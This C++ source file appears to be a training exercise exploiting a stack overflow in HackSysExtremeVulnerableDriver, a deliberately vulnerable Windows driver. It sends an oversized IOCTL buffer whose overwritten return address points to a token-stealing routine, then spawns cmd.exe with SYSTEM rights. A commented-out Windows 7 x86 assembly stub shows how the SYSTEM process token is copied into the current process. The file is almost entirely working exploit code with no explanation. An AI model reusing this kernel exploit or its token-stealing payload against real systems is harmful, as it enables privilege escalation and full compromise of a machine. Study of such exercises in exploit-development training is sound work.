#include <iostream>
#include <Windows.h>

extern "C" VOID StealToken(void);

#define DEVICE_NAME L"\\\\.\\HackSysExtremeVulnerableDriver"

// Windows 7 SP1 x86 Offsets
#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID

HANDLE GetDeviceHandle()
{
    HANDLE hRet = NULL;
    hRet = CreateFile(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL
    );

    if (hRet == INVALID_HANDLE_VALUE) {
        std::cout << "Error open device with error code" << GetLastError() << std::endl;
    }

    return hRet;
}

// 32bit
/*
VOID TokenStealingPayloadWin7() {
    // Importance of Kernel Recovery
    __asm {
        pushad                                  ; Save registers state

        ; Start of Token Stealing Stub
        xor eax, eax                            ; Set ZERO
        mov eax, fs: [eax + KTHREAD_OFFSET]     ; Get nt!_KPCR.PcrbData.CurrentThread
                                                ; _KTHREAD is located at FS : [0x124]

        mov eax, [eax + EPROCESS_OFFSET]        ; Get nt!_KTHREAD.ApcState.Process

        mov ecx, eax                            ; Copy current process _EPROCESS structure

        mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4

        SearchSystemPID:
        mov eax, [eax + FLINK_OFFSET]           ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, FLINK_OFFSET
            cmp[eax + PID_OFFSET], edx          ; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID

        mov edx, [eax + TOKEN_OFFSET]           ; Get SYSTEM process nt!_EPROCESS.Token
        mov[ecx + TOKEN_OFFSET], edx            ; Replace target process nt!_EPROCESS.Token
                                                ; with SYSTEM process nt!_EPROCESS.Token
        ; End of Token Stealing Stub

        popad                                   ; Restore registers state

        ; Kernel Recovery Stub
        xor eax, eax                            ; Set NTSTATUS SUCCEESS
        add esp, 12                             ; Fix the stack
        pop ebp                                 ; Restore saved EBP
        ret 8                                   ; Return cleanly
    }
}
*/



VOID TriggerStackOverFlow(DWORD dwCTLCode) {
    HANDLE hDev = GetDeviceHandle();
    if (!hDev)
        return;
    std::cout << "Got Device Handle :" << std::hex << hDev << std::endl;

    DWORD dwSize = 0x820;
    DWORD dwRetSize = 0;
    PVOID PayloadAddr = &StealToken;
    PVOID RetAddr = NULL;
    CHAR *Buffer = (CHAR *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!Buffer)
        return;
    RtlFillMemory(Buffer, dwSize, 'A');

    RetAddr = &Buffer[0x818];
    *(PULONG64)RetAddr = (ULONG64)PayloadAddr;

    OutputDebugString(L"[+] ==========  Kernel Mode   ============ [+]");

    if (DeviceIoControl(
        hDev,
        dwCTLCode,
        Buffer,
        dwSize,
        NULL,
        0,
        &dwRetSize,
        NULL
    )) {
        std::cout << "Done! Got systerm shell \n\n";
        system("cmd.exe");
    }
    else {
        std::cout << "...try again \n\n";
    }

    OutputDebugString(L"[+] ========== IOCTL Finished =========== [+] ");

    std::cout << "Finished Send IOCTL" << std::endl;
    HeapFree(GetProcessHeap(), 0, Buffer);
    Buffer = NULL;
}

int main()
{
    std::cout << "[+] Exercise: Stack OverFlow";
    TriggerStackOverFlow(0x222003);

    return 0;
}